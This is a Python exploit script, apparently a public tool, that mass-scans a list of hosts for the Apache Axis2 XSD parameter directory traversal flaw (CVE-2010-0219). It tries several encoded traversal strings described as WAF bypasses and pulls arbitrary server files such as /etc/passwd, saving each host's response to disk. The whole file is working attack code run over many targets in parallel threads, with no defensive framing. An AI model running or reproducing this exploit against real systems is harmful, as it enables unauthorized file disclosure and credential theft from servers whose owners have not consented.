#!/usr/bin/env python3
import argparse
import threading
import urllib.parse
import requests
import os
from datetime import datetime

# Traversal patterns for WAF bypass
TRAVERSALS = [
    "../../../../../../../../", 
    "..%2f" * 10,
    "..%252f" * 10,
    "..\\",
    "..%c0%af" * 10
]

# Lock for output/thread safety
lock = threading.Lock()

def banner():
    print("""\033[91m
╔══════════════════════════════════════════════╗
║ Axis2 XSD Directory Traversal Multi-Scanner  ║
║ CVE: CVE-2010-0219 | Version: 1.0            ║
║ Author:Maskot                                ║
╚══════════════════════════════════════════════╝
\033[0m""")


def scan_target(target_url, filepath, output_dir):
    found = False
    for traversal in TRAVERSALS:
        encoded_path = urllib.parse.quote(traversal + filepath)
        full_url = f"{target_url}?xsd={encoded_path}"

        try:
            r = requests.get(full_url, timeout=6)
            if r.status_code == 200 and "html" not in r.text.lower():
                with lock:
                    print(f"[+] SUCCESS: {target_url}")
                    print(f"    -> Traversal used: {traversal}")
                    print(f"    -> Preview: {r.text[:100]}...")
                    if output_dir:
                        host = target_url.split("//")[-1].split("/")[0].replace(":", "_")
                        outfile = f"{output_dir}/{host}_xsd_output.txt"
                        with open(outfile, "w") as f:
                            f.write(r.text)
                            print(f"    -> Saved to: {outfile}")
                found = True
                break
        except Exception as e:
            with lock:
                print(f"[-] Error connecting to {target_url} :: {e}")
            break

    if not found:
        with lock:
            print(f"[-] Not vulnerable or protected: {target_url}")


def main():
    banner()
    parser = argparse.ArgumentParser(
        description="Apache Axis2 1.4.1 XSD Parameter Directory Traversal Scanner (Multi-Host)",
        epilog="Example: python3 axis2_multi_xsd_scanner.py -l targets.txt -f /etc/passwd -o output"
    )
    parser.add_argument("-l", "--list", required=True, help="File with list of target base URLs (one per line)")
    parser.add_argument("-f", "--file", required=True, help="Remote file to retrieve (e.g. /etc/passwd)")
    parser.add_argument("-o", "--output", help="Output directory to save results")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of parallel threads (default: 5)")

    args = parser.parse_args()

    if args.output:
        os.makedirs(args.output, exist_ok=True)

    with open(args.list, "r") as f:
        targets = [line.strip().rstrip("/") for line in f if line.strip()]

    threads = []
    sem = threading.Semaphore(args.threads)

    def thread_worker(url):
        with sem:
            scan_target(url, args.file, args.output)

    for target in targets:
        t = threading.Thread(target=thread_worker, args=(target,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("\n[✔] Scan completed at", datetime.now().strftime("%H:%M:%S"))

if __name__ == "__main__":
    main()
